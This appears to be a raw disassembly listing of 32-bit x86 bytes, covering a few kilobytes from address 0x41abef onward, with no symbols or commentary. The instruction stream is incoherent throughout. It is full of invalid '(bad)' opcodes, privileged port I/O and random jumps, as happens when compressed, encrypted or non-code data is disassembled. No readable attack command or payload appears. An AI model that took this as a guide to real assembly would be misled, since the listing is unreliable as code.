  41abef:	mov    edx,0x6d2b5bf2
  41abf4:	mov    ds:0xd155080a,eax
  41abf9:	add    eax,0x1cf93102
  41abfe:	enter  0xf8b6,0xfb
  41ac02:	mov    edi,0x4310aa86
  41ac07:	cmp    esp,DWORD PTR [ecx+0x1e79e55b]
  41ac0d:	mov    ebx,0xed9673f0
  41ac12:	ret    0x6a08
  41ac15:	and    eax,0x7b088635
  41ac1a:	xchg   DWORD PTR [edx+0x6e4c859c],ecx
  41ac20:	mov    ds:0xa436bdd3,al
  41ac25:	inc    edi
  41ac26:	ds push ecx
  41ac28:	std    
  41ac29:	mov    DWORD PTR [ecx-0x2c],ebx
  41ac2c:	jg     0x41abfb
  41ac2e:	push   ebp
  41ac2f:	(bad)  
  41ac30:	xor    BYTE PTR [esi+0x4de1f198],dh
  41ac36:	inc    edi
  41ac37:	mov    bl,0x8a
  41ac39:	jle    0x41abc1
  41ac3b:	xchg   edx,eax
  41ac3c:	mov    fs,WORD PTR [ecx+0x598e312f]
  41ac42:	(bad)  [esp]
  41ac45:	push   edx
  41ac46:	shr    ah,1
  41ac48:	scas   al,BYTE PTR es:[edi]
  41ac49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac4a:	fidiv  WORD PTR [edx-0x28]
  41ac4d:	mov    dh,0xbf
  41ac4f:	mov    cl,0x91
  41ac51:	add    BYTE PTR [esi],cl
  41ac53:	push   0xffffff82
  41ac55:	adc    ebp,DWORD PTR [eax-0x48]
  41ac58:	jnp    0x41ac38
  41ac5a:	cmp    BYTE PTR [eax-0x2e],bh
  41ac5d:	js     0x41acbe
  41ac5f:	cmp    DWORD PTR [ebp+0x16],esi
  41ac62:	pop    ecx
  41ac63:	push   DWORD PTR [ebx-0x68d0c663]
  41ac69:	push   edx
  41ac6a:	fiadd  WORD PTR [ebx-0x787ce2b7]
  41ac70:	mov    dh,0x6b
  41ac72:	push   ecx
  41ac73:	xchg   edx,eax
  41ac74:	shr    DWORD PTR [esi],0x24
  41ac77:	inc    ebx
  41ac78:	or     al,0xd4
  41ac7a:	adc    DWORD PTR [esp-0x71c5980c],ecx
  41ac81:	adc    eax,0xc1b306b2
  41ac86:	mov    ah,0x2c
  41ac88:	push   edi
  41ac89:	scas   al,BYTE PTR es:[edi]
  41ac8a:	popf   
  41ac8b:	xor    dl,dh
  41ac8d:	adc    edi,DWORD PTR [ebx-0x19]
  41ac90:	pop    ecx
  41ac91:	mov    bh,bl
  41ac93:	ror    DWORD PTR [ebx],0xac
  41ac96:	xor    dh,BYTE PTR [ebx+0x33]
  41ac99:	sbb    bl,BYTE PTR [eax+0x51c02f7b]
  41ac9f:	out    0x31,al
  41aca1:	loop   0x41ac9c
  41aca3:	cli    
  41aca4:	xchg   edx,eax
  41aca5:	mov    ebp,0xb663c70c
  41acaa:	xor    eax,0x82d1f9ec
  41acaf:	xchg   edi,eax
  41acb0:	and    al,ah
  41acb2:	lahf   
  41acb3:	(bad)  
  41acb4:	push   ss
  41acb5:	ds call 0x7f80be9d
  41acbb:	bound  ecx,QWORD PTR [esp+ebp*4+0x43]
  41acbf:	mov    ds:0x767da57c,al
  41acc4:	jl     0x41acbd
  41acc6:	mov    DWORD PTR [edx+0x7],eax
  41acc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acca:	dec    edx
  41accb:	int3   
  41accc:	mov    esp,0x16193d2a
  41acd1:	xchg   ecx,eax
  41acd2:	fsubr  st,st(7)
  41acd4:	cdq    
  41acd5:	data16 scas al,BYTE PTR es:[di]
  41acd8:	sub    al,0xf
  41acda:	test   DWORD PTR [esi-0x47],0xbee6861
  41ace1:	imul   edx,DWORD PTR [edx-0x56dd8f41],0xa8c6f22b
  41aceb:	and    DWORD PTR ss:[esi+0x25],ebp
  41acef:	jmp    0x41ace1
  41acf1:	(bad)  
  41acf2:	add    al,0xe6
  41acf4:	cmp    eax,0xbc093187
  41acf9:	dec    edi
  41acfa:	cmc    
  41acfb:	clc    
  41acfc:	jno    0x41ad05
  41acfe:	rcr    DWORD PTR [ecx-0x2d],1
  41ad01:	pop    esi
  41ad02:	sbb    bl,al
  41ad04:	sti    
  41ad05:	jne    0x41ad2b
  41ad07:	mov    edx,0x7317b7f8
  41ad0c:	and    ah,ah
  41ad0e:	push   cs
  41ad0f:	scas   al,BYTE PTR es:[edi]
  41ad10:	mov    eax,0x8ecd0105
  41ad15:	sti    
  41ad16:	pop    esp
  41ad17:	jmp    0xcb1026bf
  41ad1c:	pushf  
  41ad1d:	fdivr  QWORD PTR [esi]
  41ad1f:	jns    0x41ad5d
  41ad21:	mov    al,0x7c
  41ad23:	push   ss
  41ad24:	push   ds
  41ad25:	leave  
  41ad26:	dec    esi
  41ad27:	test   al,0xf6
  41ad29:	and    DWORD PTR [esi+0x30],esi
  41ad2c:	clc    
  41ad2d:	ins    DWORD PTR es:[edi],dx
  41ad2e:	repz scas eax,DWORD PTR es:[edi]
  41ad30:	stc    
  41ad31:	cdq    
  41ad32:	jb     0x41ada5
  41ad34:	push   edx
  41ad35:	add    DWORD PTR [esi+0x9],esi
  41ad38:	sbb    ebp,eax
  41ad3a:	leave  
  41ad3b:	jg     0x41ad4c
  41ad3d:	cmp    al,0x83
  41ad3f:	pop    esp
  41ad40:	iret   
  41ad41:	setp   BYTE PTR [ebx-0x69c47b8c]
  41ad48:	or     DWORD PTR [eax+ecx*8-0xe],eax
  41ad4c:	fwait
  41ad4d:	sbb    ch,BYTE PTR [eax+ebx*8-0x3d8b8f2]
  41ad54:	mov    WORD PTR [edx+0x6b],es
  41ad57:	cdq    
  41ad58:	xchg   ebp,eax
  41ad59:	xchg   esp,eax
  41ad5a:	mov    esp,0xd45327dd
  41ad5f:	aam    0xc1
  41ad61:	cwde   
  41ad62:	cmp    eax,0x2d343da2
  41ad67:	out    0x6f,eax
  41ad69:	mov    ebp,0x6e50ee71
  41ad6e:	jecxz  0x41ad1b
  41ad70:	je     0x41ad60
  41ad72:	leave  
  41ad73:	gs push ss
  41ad75:	shr    eax,0xc5
  41ad78:	push   ds
  41ad79:	enter  0x3e40,0x73
  41ad7d:	pop    edi
  41ad7e:	sar    DWORD PTR [eax-0x78],0x5e
  41ad82:	push   ss
  41ad83:	add    BYTE PTR [edx],ah
  41ad85:	jp     0x41adba
  41ad87:	cli    
  41ad88:	adc    BYTE PTR [edi-0x5053708a],cl
  41ad8e:	push   edx
  41ad8f:	jle    0x41ada2
  41ad91:	fwait
  41ad92:	xor    al,0x83
  41ad94:	jg     0x41adca
  41ad96:	ret    
  41ad97:	jmp    0x41adb5
  41ad99:	rcr    BYTE PTR [esi+0x4e],cl
  41ad9c:	pop    ebx
  41ad9d:	sub    cl,ah
  41ad9f:	stos   BYTE PTR es:[edi],al
  41ada0:	repz xor eax,DWORD PTR ds:0x16e92a49
  41ada7:	ret    0xcb3
  41adaa:	aam    0xe6
  41adac:	scas   al,BYTE PTR es:[edi]
  41adad:	add    al,0xf5
  41adaf:	xchg   BYTE PTR [esi+0x6b6f5029],dh
  41adb5:	stos   DWORD PTR es:[edi],eax
  41adb6:	inc    ebp
  41adb7:	imul   ebp,DWORD PTR [edx],0xde6f0ee1
  41adbd:	add    al,0xa9
  41adbf:	jns    0x41addf
  41adc1:	loopne 0x41adb1
  41adc3:	fiadd  WORD PTR [ebp+0x7f603b15]
  41adc9:	hlt    
  41adca:	in     al,0x64
  41adcc:	loop   0x41ade7
  41adce:	data16 rcr BYTE PTR [eax],cl
  41add1:	test   BYTE PTR [ebp-0x4],bh
  41add4:	sub    eax,0xe6c1e7e6
  41add9:	dec    edi
  41adda:	mov    eax,ds:0xd7bf5033
  41addf:	or     al,0x9b
  41ade1:	shl    DWORD PTR es:[eax+0x6aee6d43],0x4d
  41ade9:	mov    dl,0xf7
  41adeb:	inc    edx
  41adec:	jbe    0x41adb7
  41adee:	xor    dh,BYTE PTR [ecx-0x62]
  41adf1:	mov    bl,bl
  41adf3:	mov    ?,WORD PTR [edx+0x43]
  41adf6:	sub    al,0x25
  41adf9:	lods   eax,DWORD PTR ds:[esi]
  41adfa:	loopne 0x41ae2b
  41adfc:	jno    0x41ae20
  41adfe:	cmp    DWORD PTR [esi],ebp
  41ae00:	push   es
  41ae01:	jb     0x41addb
  41ae03:	inc    ebx
  41ae04:	mov    ah,0x91
  41ae06:	dec    esp
  41ae07:	cwde   
  41ae08:	cmp    eax,0x69d716ab
  41ae0d:	ss dec ebp
  41ae0f:	pop    es
  41ae10:	loope  0x41ae6c
  41ae12:	lock mov cl,0x72
  41ae15:	int3   
  41ae16:	fimul  WORD PTR [eax+0x3b870df4]
  41ae1d:	jecxz  0x41ae16
  41ae1f:	inc    esp
  41ae20:	mov    ch,0xbf
  41ae22:	bound  eax,QWORD PTR [ebx-0x45]
  41ae25:	icebp  
  41ae26:	dec    edi
  41ae27:	stos   BYTE PTR es:[edi],al
  41ae28:	pushf  
  41ae29:	ss ja  0x41ae0e
  41ae2c:	xor    eax,0x91d0cb3e
  41ae31:	or     DWORD PTR [ebx+0x4a],eax
  41ae34:	xor    DWORD PTR [ebx],ebx
  41ae36:	cs icebp 
  41ae38:	cdq    
  41ae39:	mul    BYTE PTR [edi-0x1]
  41ae3c:	add    eax,0xeac28c8f
  41ae41:	aam    0x48
  41ae43:	sub    eax,0xf29a1aed
  41ae48:	aaa    
  41ae49:	or     al,0x66
  41ae4b:	jl     0x41ae4e
  41ae4d:	shl    DWORD PTR [eax-0x4b],cl
  41ae50:	sub    ah,BYTE PTR [esi+0x237d989e]
  41ae56:	mov    WORD PTR [esi*2+0x476e3d56],es
  41ae5d:	inc    ebx
  41ae5e:	sbb    esp,DWORD PTR [edi-0x22]
  41ae61:	mov    ebx,DWORD PTR [ecx]
  41ae63:	push   esp
  41ae64:	dec    eax
  41ae65:	add    eax,0xe228203e
  41ae6a:	rol    DWORD PTR [ebx-0x15],0xa
  41ae6e:	icebp  
  41ae6f:	ja     0x41ae7f
  41ae71:	mov    al,ds:0xeeebc136
  41ae76:	shl    DWORD PTR [edx],cl
  41ae78:	jge    0x41aec5
  41ae7a:	in     eax,dx
  41ae7b:	xor    edi,DWORD PTR [esi+0x6f23f55e]
  41ae81:	ret    
  41ae82:	inc    esp
  41ae83:	ins    DWORD PTR es:[edi],dx
  41ae84:	and    edi,DWORD PTR [eax-0x6f]
  41ae87:	mov    ebp,0x3e40ad5f
  41ae8c:	push   0xffffffd7
  41ae8e:	jecxz  0x41af07
  41ae90:	dec    esp
  41ae91:	inc    edi
  41ae92:	lea    esi,[ebx+0x33]
  41ae95:	sbb    eax,0x48e26757
  41ae9a:	inc    edx
  41ae9b:	cld    
  41ae9c:	fbld   TBYTE PTR [ebx+0x6dc58b86]
  41aea2:	bound  eax,QWORD PTR [ecx]
  41aea4:	push   es
  41aea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aea6:	push   edi
  41aea7:	test   al,0xf0
  41aea9:	cs jae 0x41ae3c
  41aeac:	into   
  41aead:	sub    eax,0x48433e46
  41aeb2:	cmp    al,0xb7
  41aeb4:	mov    ds:0x9d3043dd,eax
  41aeb9:	cdq    
  41aeba:	mov    esp,0xcce0fa97
  41aebf:	pop    edi
  41aec0:	lods   al,BYTE PTR ds:[esi]
  41aec1:	pop    edi
  41aec2:	cwde   
  41aec3:	test   al,0xe3
  41aec5:	adc    edx,DWORD PTR [eax]
  41aec7:	mov    esp,0x937544e1
  41aecc:	jb     0x41af3c
  41aece:	cmp    eax,0xf6cf7545
  41aed3:	mov    ds:0x564120d8,al
  41aed8:	adc    eax,DWORD PTR [edi-0x6621617d]
  41aede:	ins    BYTE PTR es:[edi],dx
  41aedf:	jmp    0xc0db015a
  41aee4:	mov    edi,0xba500cd7
  41aee9:	and    eax,0x4ae8e077
  41aeee:	mov    ds:0xe448d84f,al
  41aef3:	cmp    eax,0xd9bae5bd
  41aef8:	gs xchg ecx,eax
  41aefa:	sbb    BYTE PTR [edx+0x673b2f9f],dl
  41af00:	pop    ebx
  41af01:	ss push edi
  41af03:	aaa    
  41af04:	je     0x41af72
  41af06:	adc    al,0x21
  41af08:	sbb    DWORD PTR [ecx+0x4ae7d94b],esp
  41af0e:	xchg   esi,eax
  41af0f:	(bad)  
  41af10:	dec    ebx
  41af11:	aam    0xa0
  41af13:	cmp    ebx,DWORD PTR [ebx-0x53]
  41af16:	mov    al,0x33
  41af18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af19:	mov    ah,BYTE PTR [ebp+eax*1+0x610c0c25]
  41af20:	jecxz  0x41af24
  41af22:	adc    DWORD PTR [edi+0x26eca5df],ebx
  41af28:	mov    al,bh
  41af2a:	out    dx,eax
  41af2b:	pop    eax
  41af2c:	jecxz  0x41aed4
  41af2e:	xchg   dl,ch
  41af30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af31:	xchg   esp,eax
  41af32:	test   eax,0x72ca04f5
  41af37:	daa    
  41af38:	xor    BYTE PTR [edi+edi*8+0x5e],cl
  41af3c:	and    al,0x96
  41af3e:	mov    dl,0x5
  41af40:	test   DWORD PTR [eax+0x22da182d],edx
  41af46:	mov    ebp,0x7b65bf7b
  41af4b:	jno    0x41af6f
  41af4d:	add    edx,esi
  41af4f:	outs   dx,DWORD PTR es:[esi]
  41af51:	jmp    0x41af74
  41af53:	imul   cl
  41af55:	push   ebp
  41af56:	inc    ecx
  41af57:	xchg   edx,eax
  41af58:	gs jnp 0x41aedd
  41af5b:	gs into 
  41af5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af5e:	adc    bh,0x82
  41af61:	daa    
  41af62:	push   edi
  41af63:	(bad)  
  41af64:	lods   al,BYTE PTR ds:[esi]
  41af65:	es jns 0x41af15
  41af68:	pop    edx
  41af69:	loop   0x41af84
  41af6b:	pop    es
  41af6c:	ret    
  41af6d:	xchg   ecx,eax
  41af6e:	sub    DWORD PTR [eax+0x4bec0d4f],esi
  41af74:	or     al,0x9f
  41af76:	cdq    
  41af77:	cli    
  41af78:	mov    eax,ds:0x66d16ecc
  41af7d:	scas   eax,DWORD PTR es:[edi]
  41af7e:	cmp    al,al
  41af80:	inc    eax
  41af81:	popf   
  41af82:	mov    cl,0x8b
  41af84:	repnz mov ebx,0xc240cf0e
  41af8a:	or     eax,0xb834b82b
  41af8f:	inc    esp
  41af90:	adc    eax,0xc8e2d3e3
  41af95:	and    esp,DWORD PTR [ebx]
  41af97:	pop    esp
  41af98:	cmp    BYTE PTR [esi],bh
  41af9a:	sub    DWORD PTR [eax+0x27],0xa4d4ad18
  41afa1:	mov    dl,0xeb
  41afa3:	js     0x41af47
  41afa5:	inc    edi
  41afa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afa7:	mov    ebp,0x9a0b0c69
  41afac:	nop
  41afad:	daa    
  41afae:	(bad)  
  41afaf:	mov    esi,0x5381061f
  41afb4:	loope  0x41b029
  41afb6:	and    dl,ch
  41afb8:	mov    dh,0xde
  41afba:	loopne 0x41affb
  41afbc:	and    cl,dl
  41afbe:	and    DWORD PTR [edx],ebp
  41afc0:	out    dx,eax
  41afc1:	mov    edi,0x9c4039bb
  41afc6:	out    0xbc,al
  41afc8:	retf   0x5cb2
  41afcb:	sahf   
  41afcc:	fdiv   QWORD PTR [esi+ecx*4]
  41afcf:	and    esi,DWORD PTR [edi]
  41afd1:	inc    ebx
  41afd2:	cmc    
  41afd3:	jl     0x41afab
  41afd5:	in     al,0xe1
  41afd7:	dec    esi
  41afd8:	lea    esp,[esi+0x7182accc]
  41afde:	inc    ebx
  41afdf:	sub    al,0x1a
  41afe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afe3:	add    al,0x88
  41afe5:	fdivr  QWORD PTR [ebp+0xb]
  41afe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afe9:	cld    
  41afea:	cmp    bl,BYTE PTR [eax+0x63366d4b]
  41aff0:	lods   al,BYTE PTR ds:[esi]
  41aff1:	xor    al,0x8a
  41aff3:	out    dx,eax
  41aff4:	enter  0x53e4,0x36
  41aff8:	arpl   bp,bx
  41affa:	and    ebp,DWORD PTR [ecx+0x7a]
  41affd:	pop    eax
  41affe:	ret    
  41afff:	cwde   
  41b000:	mov    dh,BYTE PTR [edi-0x60]
  41b003:	inc    eax
  41b004:	dec    ebx
  41b005:	mov    esp,0xfc8358fc
  41b00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00b:	sub    DWORD PTR [ebx-0x23],esi
  41b00e:	test   BYTE PTR [edx+eax*4-0x9],dl
  41b012:	fist   WORD PTR [ebx+esi*4+0x76]
  41b016:	lahf   
  41b017:	shl    DWORD PTR [ecx-0x6b],cl
  41b01a:	mov    ebx,0xc6ce4570
  41b01f:	inc    edx
  41b020:	jp     0x41b088
  41b022:	jmp    0x920dd985
  41b027:	retf   0xe6f6
  41b02a:	(bad)  
  41b02b:	fsub   st(4),st
  41b02d:	xor    eax,edi
  41b02f:	fadd   DWORD PTR [ebx-0x52]
  41b032:	adc    DWORD PTR [eax],esi
  41b034:	fadd   st,st(1)
  41b036:	scas   al,BYTE PTR es:[edi]
  41b037:	mov    ah,0xbb
  41b039:	adc    BYTE PTR [edx],cl
  41b03b:	mov    ebp,0xb6f070ea
  41b040:	aaa    
  41b041:	adc    bl,cl
  41b043:	cmp    eax,0x1a0a9ca5
  41b048:	sub    al,0x95
  41b04a:	test   DWORD PTR [ebx-0x7515e6de],eax
  41b050:	jl     0x41b063
  41b052:	cmp    DWORD PTR [edi+0x52],esi
  41b055:	stos   DWORD PTR es:[edi],eax
  41b056:	(bad)  
  41b057:	xor    eax,0x7a5c300d
  41b05c:	ret    0xfd
  41b05f:	jbe    0x41afe5
  41b061:	enter  0xc768,0xa3
  41b065:	xchg   edi,eax
  41b066:	inc    edi
  41b067:	clc    
  41b068:	pop    es
  41b069:	imul   ebp,eax,0x6b
  41b06c:	mov    ebx,0x961fc1d2
  41b071:	xchg   esp,eax
  41b072:	add    dh,BYTE PTR [esi+eax*8+0xbda564c]
  41b079:	inc    esi
  41b07a:	lods   eax,DWORD PTR ds:[esi]
  41b07b:	nop
  41b07c:	pop    ds
  41b07d:	mov    ds:0xef26acdf,eax
  41b082:	cmp    DWORD PTR [edi],0xffffff88
  41b085:	(bad)  
  41b086:	std    
  41b087:	mov    DWORD PTR [ebp+0x1c],0xa332563f
  41b08e:	ror    BYTE PTR [ebp+0x3827beec],cl
  41b094:	mov    ah,0x2c
  41b096:	xchg   edi,eax
  41b097:	icebp  
  41b098:	sbb    DWORD PTR [esi],ecx
  41b09a:	fbld   TBYTE PTR [esi]
  41b09c:	mov    ebx,0xc4a43e9f
  41b0a1:	(bad)  
  41b0a2:	out    dx,al
  41b0a3:	mov    ebp,0xdc198c4
  41b0a8:	icebp  
  41b0a9:	push   ebx
  41b0aa:	push   ebp
  41b0ab:	ror    BYTE PTR [ebx+ecx*4],1
  41b0ae:	mov    DWORD PTR [ebx+0xb],esp
  41b0b1:	xchg   ebx,eax
  41b0b2:	xor    al,0x26
  41b0b4:	mov    ch,0xa9
  41b0b6:	mov    ah,0xba
  41b0b8:	mov    edi,0x28b0146a
  41b0bd:	stos   BYTE PTR es:[edi],al
  41b0be:	jecxz  0x41b088
  41b0c0:	je     0x41b06e
  41b0c2:	jecxz  0x41b143
  41b0c4:	aam    0x18
  41b0c6:	dec    ebp
  41b0c7:	stos   BYTE PTR es:[edi],al
  41b0c8:	(bad)  
  41b0c9:	adc    BYTE PTR [eax+0x72],ch
  41b0cc:	arpl   WORD PTR [esi],bx
  41b0ce:	retf   0x5522
  41b0d1:	clc    
  41b0d2:	pop    ebp
  41b0d3:	shr    BYTE PTR [esi+0x5f665dac],0xf5
  41b0da:	ds in  al,dx
  41b0dc:	xchg   ebx,eax
  41b0dd:	fcomp  QWORD PTR ds:0x3aed52d8
  41b0e3:	pop    ds
  41b0e4:	cdq    
  41b0e5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0e7:	add    eax,ebx
  41b0e9:	fisttp DWORD PTR [edi-0x80]
  41b0ec:	fmul   st(1),st
  41b0ee:	cmp    eax,0x267b6998
  41b0f3:	pop    ss
  41b0f4:	sub    ch,BYTE PTR [edx+0x35]
  41b0f7:	outs   dx,DWORD PTR ds:[esi]
  41b0f8:	outs   dx,BYTE PTR ds:[esi]
  41b0f9:	xor    dh,BYTE PTR [edi+ebx*1]
  41b0fc:	bnd jge 0x41b150
  41b0ff:	dec    esp
  41b100:	repnz sbb al,0x7a
  41b103:	sub    DWORD PTR es:[ebx-0x9257d3],ecx
  41b10a:	cdq    
  41b10b:	jmp    0x41b0c9
  41b10d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b10e:	xor    al,0xed
  41b110:	scas   eax,DWORD PTR es:[edi]
  41b111:	adc    DWORD PTR [ecx],0x30
  41b114:	inc    ebp
  41b115:	push   ebx
  41b116:	and    eax,0xd4af8bc8
  41b11b:	push   es
  41b11c:	jbe    0x41b129
  41b11e:	cmp    DWORD PTR [ecx-0x7428a130],ebp
  41b124:	fwait
  41b125:	jge    0x41b138
  41b127:	dec    edx
  41b128:	mov    eax,0xde464457
  41b12d:	mov    cl,0xf5
  41b12f:	xchg   ebp,eax
  41b130:	retf   
  41b131:	adc    eax,0x6921f122
  41b136:	add    BYTE PTR [edx+eax*8-0x3141e22e],0x17
  41b13e:	push   eax
  41b13f:	jp     0x41b0fe
  41b141:	and    DWORD PTR [ecx],edi
  41b143:	in     al,0x48
  41b145:	aaa    
  41b146:	pop    ebx
  41b147:	adc    eax,0xb6308bee
  41b14c:	xor    cl,ch
  41b14e:	inc    eax
  41b14f:	pop    edx
  41b150:	nop
  41b151:	dec    ecx
  41b152:	div    ebx
  41b154:	dec    esp
  41b155:	jnp    0x41b177
  41b157:	inc    ebp
  41b158:	push   esp
  41b159:	xchg   BYTE PTR [edx-0xb0dd048],cl
  41b15f:	inc    edi
  41b160:	or     eax,0x9406cdc6
  41b165:	pushf  
  41b166:	push   ss
  41b167:	call   0x34dd453d
  41b16c:	mov    ds:0x7d287175,eax
  41b171:	or     edx,DWORD PTR [eax+0x23]
  41b174:	iret   
  41b175:	loope  0x41b135
  41b177:	jns    0x41b1e9
  41b179:	xchg   esi,eax
  41b17a:	push   cs
  41b17b:	js     0x41b179
  41b17d:	xor    ebx,DWORD PTR [ecx+0x49]
  41b180:	or     BYTE PTR [ecx+0x78],0xe
  41b184:	rcr    edx,0xc7
  41b187:	or     eax,0x92a8346
  41b18c:	loopne 0x41b1cc
  41b18e:	xchg   esi,eax
  41b18f:	ins    BYTE PTR es:[edi],dx
  41b190:	push   edx
  41b191:	aam    0xc2
  41b193:	(bad)  
  41b194:	mov    DWORD PTR [esi+0x318cda9b],0xa1ce97ab
  41b19e:	test   DWORD PTR [esi-0x5fdca70],esp
  41b1a4:	mov    ds:0x361a6eb9,al
  41b1a9:	xor    esi,DWORD PTR [ebp-0x6c12a5d4]
  41b1af:	or     edx,DWORD PTR [ecx-0x7b2493f0]
  41b1b5:	add    BYTE PTR [eax+0x7f4e1be3],bl
  41b1bb:	mov    ah,0x69
  41b1bd:	pop    ebp
  41b1be:	(bad)  
  41b1bf:	in     al,dx
  41b1c0:	stos   DWORD PTR es:[edi],eax
  41b1c1:	fdiv   st,st(1)
  41b1c3:	mov    WORD PTR [eax],fs
  41b1c5:	mov    ah,0x66
  41b1c7:	dec    edx
  41b1c8:	push   esp
  41b1c9:	sub    BYTE PTR [edx+0x71e760cc],0x15
  41b1d0:	fs adc al,0xca
  41b1d3:	scas   eax,DWORD PTR es:[edi]
  41b1d4:	mov    DWORD PTR [ecx],edi
  41b1d6:	sar    bh,1
  41b1d8:	cmc    
  41b1d9:	(bad)  
  41b1da:	pop    edx
  41b1db:	dec    esi
  41b1dc:	data16 sahf 
  41b1de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1df:	adc    DWORD PTR [ecx+0x3e],0xc5f22082
  41b1e6:	out    dx,eax
  41b1e7:	mov    esi,0xf6160133
  41b1ec:	dec    ecx
  41b1ed:	pop    esi
  41b1ee:	ss sti 
  41b1f0:	ret    
  41b1f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1f2:	and    BYTE PTR [ecx+0x4bb0d461],dl
  41b1f8:	lahf   
  41b1f9:	cmp    eax,0x3fe74e24
  41b1fe:	xchg   edi,eax
  41b1ff:	mov    cl,0xf0
  41b201:	mov    bh,0xc3
  41b203:	cmp    DWORD PTR [ebx+0x2f],edi
  41b206:	inc    si
  41b208:	fld    QWORD PTR [edi]
  41b20a:	rcl    DWORD PTR ds:0x147191f7,cl
  41b210:	lods   eax,DWORD PTR ds:[esi]
  41b211:	inc    esp
  41b212:	mov    ecx,0x21b6a174
  41b217:	dec    esi
  41b218:	test   DWORD PTR [eax+0x55],edi
  41b21b:	ret    0xfab1
  41b21e:	push   edi
  41b21f:	sub    al,0xb6
  41b221:	add    BYTE PTR [edi-0x135231ac],ah
  41b227:	pop    edx
  41b228:	jne    0x41b241
  41b22a:	stos   BYTE PTR es:[edi],al
  41b22b:	repz jb 0x41b244
  41b22e:	pop    ebp
  41b22f:	in     al,dx
  41b230:	int3   
  41b231:	dec    esp
  41b232:	ficom  WORD PTR [ebx+eax*4]
  41b235:	cmp    al,0x5f
  41b237:	sub    al,dh
  41b239:	dec    edx
  41b23a:	inc    DWORD PTR [eax]
  41b23c:	ret    
  41b23d:	mov    ebx,0xcbef5f91
  41b242:	outs   dx,BYTE PTR ds:[esi]
  41b243:	outs   dx,DWORD PTR ds:[esi]
  41b244:	push   esp
  41b245:	mov    al,0x96
  41b247:	dec    edx
  41b248:	dec    edx
  41b249:	and    al,0xe5
  41b24b:	push   ecx
  41b24c:	cmc    
  41b24d:	jns    0x41b215
  41b24f:	sub    al,BYTE PTR [eax+0x58700adc]
  41b255:	mov    fs,WORD PTR [esi+0x3e]
  41b258:	cmp    DWORD PTR [edi-0x1f],0x65
  41b25c:	jmp    0x90436ceb
  41b261:	imul   esi,edi,0x54
  41b264:	adc    esp,ebx
  41b266:	or     BYTE PTR [edx],bl
  41b268:	sub    al,0x12
  41b26a:	xor    DWORD PTR [esi+0xd],ebp
  41b26d:	xchg   ebp,eax
  41b26e:	mov    edx,0x87f5d1cc
  41b273:	das    
  41b274:	int3   
  41b275:	out    dx,eax
  41b276:	scas   al,BYTE PTR es:[edi]
  41b277:	jb     0x41b20f
  41b279:	jno    0x41b245
  41b27b:	aaa    
  41b27c:	fsubr  DWORD PTR ds:0x8e42c34a
  41b282:	mov    al,0x59
  41b284:	sub    eax,0xaa9c54d1
  41b289:	or     DWORD PTR [edx-0xc43ca26],ebx
  41b28f:	and    DWORD PTR [edi],edi
  41b291:	cwde   
  41b292:	inc    ebp
  41b293:	dec    esi
  41b294:	mov    DWORD PTR [ebp-0xddec1ac],edi
  41b29a:	push   edi
  41b29b:	push   esp
  41b29c:	rcr    DWORD PTR [edi-0x3b1a2abe],cl
  41b2a2:	repnz lock in al,dx
  41b2a5:	lods   eax,DWORD PTR ds:[esi]
  41b2a6:	pop    esp
  41b2a7:	js     0x41b30b
  41b2a9:	or     dh,BYTE PTR [edx]
  41b2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2ac:	adc    edx,DWORD PTR [eax+0x60]
  41b2af:	sahf   
  41b2b0:	call   edx
  41b2b2:	imul   ebx,DWORD PTR [esp+0x6b4ff96a],0xe55ab391
  41b2bd:	and    esi,DWORD PTR [ebp-0x34]
  41b2c0:	push   esp
  41b2c1:	mov    ch,0x42
  41b2c3:	pop    edi
  41b2c4:	or     al,0xb7
  41b2c6:	or     eax,ebx
  41b2c8:	sbb    al,BYTE PTR [edi]
  41b2ca:	push   esi
  41b2cb:	pop    ebx
  41b2cc:	dec    edx
  41b2cd:	mov    dl,0x2b
  41b2cf:	inc    edx
  41b2d0:	mov    ch,0x77
  41b2d2:	outs   dx,BYTE PTR ds:[esi]
  41b2d3:	imul   esi,DWORD PTR [edx+eiz*2-0x13],0xd2567182
  41b2db:	lock (bad) 
  41b2dd:	mov    gs:0xbfab0707,al
  41b2e3:	dec    ecx
  41b2e4:	shl    al,0x54
  41b2e7:	push   cs
  41b2e8:	adc    dl,BYTE PTR [edi-0x4617a927]
  41b2ee:	in     al,dx
  41b2ef:	xor    al,BYTE PTR [ebp-0x274527c2]
  41b2f5:	pop    ds
  41b2f6:	sar    DWORD PTR [edx-0x35a4f93c],cl
  41b2fc:	fcmovu st,st(2)
  41b2fe:	inc    ecx
  41b2ff:	test   BYTE PTR [edi],0xce
  41b302:	std    
  41b303:	jbe    0x41b338
  41b305:	jle    0x41b2cb
  41b307:	retf   0x836b
  41b30a:	push   ds
  41b30b:	imul   ecx,edi,0xffffffe6
  41b30e:	imul   ecx,esp,0xd31896fd
  41b314:	jecxz  0x41b2f7
  41b316:	in     eax,dx
  41b317:	dec    esi
  41b318:	sub    eax,0x6b2c67b4
  41b31d:	adc    BYTE PTR [eax+0x5d],cl
  41b320:	in     eax,dx
  41b321:	jmp    0xe8a1:0xac21429e
  41b328:	mov    ecx,0x392734b9
  41b32d:	cdq    
  41b32e:	(bad)  
  41b330:	pop    ss
  41b331:	setno  BYTE PTR [ebp-0x27]
  41b335:	fst    DWORD PTR [edi+eax*8]
  41b338:	mov    ecx,ebx
  41b33a:	loope  0x41b2ca
  41b33c:	mov    ebp,0x5462b296
  41b341:	pusha  
  41b342:	xlat   BYTE PTR ds:[ebx]
  41b343:	shl    DWORD PTR [esi-0xd],0xe3
  41b347:	ret    
  41b348:	fcomp  DWORD PTR [ebp-0x71b79caf]
